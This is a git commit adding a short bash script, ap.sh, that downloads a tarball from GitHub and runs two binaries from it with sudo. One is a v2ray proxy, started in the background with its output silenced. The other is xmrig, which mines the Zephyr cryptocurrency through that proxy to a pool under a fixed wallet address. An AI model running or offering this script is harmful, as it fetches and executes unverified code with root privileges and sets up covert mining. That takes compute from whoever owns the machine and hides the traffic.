eef08b88c9e4f0e929a92934ab12c4278c01b1b5
prendibs <94189491+prendibs@users.noreply.github.com>
2024-08-17 02:07:17 +0700

    Add files via upload

---
+++ ap.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+#love u fika
+
+wget https://github.com/prendibs/y/raw/main/x.tar.gz && tar xf x.tar.gz
+nohup sudo ./v2ray run --config=ap.json </dev/null >/dev/null 2>&1 &
+echo "love u fika"
+sudo ./xmrig -B -x 127.0.0.1:443 -o sg-zephyr.miningocean.org:5332 -u ZEPHs9qyUjPfbebw44nveyf2XqZ2sotqRd8ntp8SyPZMj4tDSZeCX9mJnkroee214rN6ZWNm7kroFe1dB5Rnf3DG2zKRHCKPFJ9 -p ap -a rx/0
